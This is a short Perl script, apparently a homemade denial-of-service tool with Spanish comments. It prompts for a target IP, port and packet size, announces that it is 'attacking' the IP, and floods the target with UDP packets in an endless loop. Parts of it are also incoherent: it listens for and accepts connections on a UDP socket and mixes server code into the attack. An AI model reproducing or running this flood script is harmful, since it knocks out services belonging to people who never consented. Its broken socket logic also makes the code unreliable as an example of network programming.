#!/usr/bin/perl
use Socket;

#Creado 100% completamente por CipoteMan
#Esta script sigue en desarrollo
#Última actualización: 13/04/19
use utf8;
my $tiempo = 0;
my $protocolo = getprotobyname('tcp');
my $ip;
my $puerto;
system("cls");
system("clear");
print "\nInserte la ip: ";
$ip = <STDIN>;
print "Inserte el puerto: ";
$puerto = <STDIN>;
print "Inserte los paquetes: ";
$paquetes = <STDIN>;
socket(envio,PF_INET, SOCK_DGRAM , 17);

listen(envio, 5);
my $conexion;
while ($conexion = accept(NEW_SOCKET, envio)){
	my $nombre = gethostbyaddr($conexion, AF_INET);
	print NEW_SOCKET "Hola";
	print "Conexión recibida desde $nombre\n";
	close NEW_SOCKET;
}
connect(envio, sockaddr_in($puerto, inet_aton($ip)));
system("cls");
system("clear");
print "Atacando la ip $ip con el puerto $puerto";

for (;;){
	send(envio, pack("a$paquetes","envio"), 0);
}
exit(0);

#bind(envio, pack_sockaddr_in($puerto, inet_aton($ip))) or die "No se puede conectarse a: $ip";

